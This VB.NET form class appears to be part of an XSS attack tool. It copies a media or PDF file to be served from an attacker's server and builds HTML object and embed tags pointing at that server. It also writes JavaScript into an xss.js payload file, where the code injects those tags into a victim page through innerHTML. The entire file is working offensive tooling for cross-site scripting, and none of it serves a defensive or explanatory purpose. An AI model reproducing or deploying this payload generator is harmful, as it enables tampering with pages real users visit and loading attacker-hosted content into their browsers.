Public Class xss_load_file
    Dim payload As String
    Dim q As String = """"
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        OpenFileDialog1.FileName = ""
        If ComboBox1.Text = "PDF" Then
            OpenFileDialog1.Filter = "PDF Files(*.pdf)|*.pdf"
        ElseIf ComboBox1.Text = "WAV" Then
            OpenFileDialog1.Filter = "WAV Files(*.wav)|*.wav"
        ElseIf ComboBox1.Text = "MP3" Then
            OpenFileDialog1.Filter = "MP3 Files(*.mp3)|*.mp3"
        ElseIf ComboBox1.Text = "MP4" Then
            OpenFileDialog1.Filter = "MP4 Files(*.mp4)|*.mp4"
        ElseIf ComboBox1.Text = "WMV" Then
            OpenFileDialog1.Filter = "WMV Files(*.wmv)|*.wmv"
        ElseIf ComboBox1.Text = "SWF" Then
            OpenFileDialog1.Filter = "SWF Files(*.swf)|*.swf"
        End If
        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            Button4.Enabled = True
            TextBox1.Text = OpenFileDialog1.FileName
        Else
            Button4.Enabled = False
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        Dim injection_payload As String = ""
        Dim filename As String = ""
        If ComboBox1.Text = "PDF" Then
            filename = "file.pdf"
            injection_payload = "pdf_v = document.createElement('div'); pdf_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(pdf_v);"
        ElseIf ComboBox1.Text = "SWF" Then
            filename = "file.swf"
            injection_payload = "swf_v = document.createElement('div'); swf_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(swf_v);"
        ElseIf ComboBox1.Text = "MP3" Then
            filename = "file.mp3"
            injection_payload = "mp3_v = document.createElement('div'); mp3_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(mp3_v);"
        ElseIf ComboBox1.Text = "MP4" Then
            filename = "file.mp4"
            injection_payload = "mp4_v = document.createElement('div'); mp4_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(mp4_v);"
        ElseIf ComboBox1.Text = "WMV" Then
            filename = "file.wmv"
            injection_payload = "wmv_v = document.createElement('div'); wmv_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(wmv_v);"
        ElseIf ComboBox1.Text = "WAV" Then
            filename = "file.wav"
            injection_payload = "wav_v = document.createElement('div'); wav_v.innerHTML = " & q & TextBox2.Text & q & "; document.body.appendChild(wav_v);"
        End If
        IO.File.Copy(OpenFileDialog1.FileName, filename)
        Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js", append:=True)
        streamx.WriteLine(injection_payload)
        streamx.Close()
        MsgBox("Payload Injected!", vbInformation)
    End Sub


    Private Sub xss_load_pdf_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("file.pdf")
        IO.File.Delete("file.mp3")
        IO.File.Delete("file.mp4")
        IO.File.Delete("file.wmv")
        IO.File.Delete("file.swf")
        IO.File.Delete("file.wav")
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("file.pdf")
        IO.File.Delete("file.mp3")
        IO.File.Delete("file.mp4")
        IO.File.Delete("file.wmv")
        IO.File.Delete("file.swf")
        IO.File.Delete("file.wav")
        Me.Close()
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click


        If ComboBox1.Text = "PDF" Then
            TextBox2.Text = "<object width='500' height='650' data='http://" & xss_server.server_ip & "/file.pdf' type='application/pdf' ></object>"
        ElseIf ComboBox1.Text = "SWF" Then
            TextBox2.Text = "<object width='400' height='40'><param name='SRC' value='http://" & xss_server.server_ip & "/file.swf'><embed src='http://" & xss_server.server_ip & "/file.swf' width='400' height='40'></embed></object>"
        ElseIf ComboBox1.Text = "MP3" Then
            TextBox2.Text = "<object height='0' width='0' data='http://" & xss_server.server_ip & "/file.mp3'></object>"
        ElseIf ComboBox1.Text = "MP4" Then
            TextBox2.Text = "<object width='420' height='360'><param name='src' value='http://" & xss_server.server_ip & "/file.mp4'><param name='controller' value='true'></object>"
        ElseIf ComboBox1.Text = "WMV" Then
            TextBox2.Text = "<object width='100%' height='100%' type='video/x-ms-asf' url='http://" & xss_server.server_ip & "/file.wmv' data='http://" & xss_server.server_ip & "/file.wmv'><param name='url' value='http://" & xss_server.server_ip & "/file.wmv'><param name='filename' value='http://" & xss_server.server_ip & "/file.wmv'><param name='autostart' value='1'><param name='uiMode' value='full'><param name='autosize' value='1'><param name='playcount' value='1'><embed type='application/x-mplayer2' src='http://" & xss_server.server_ip & "/file.wmv' width='100%' height='100%' autostart='true' showcontrols='true></embed></object>"
        ElseIf ComboBox1.Text = "WAV" Then
            TextBox2.Text = "<object width='0' height='0'><param name='src' value='http://" & xss_server.server_ip & "/file.wav'><param name='controller' value='true'></object>"


        End If
        Button2.Enabled = True
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.Text.Equals("Select File Type") Then
            Button1.Enabled = False
        Else
            Button1.Enabled = True
        End If
    End Sub
End Class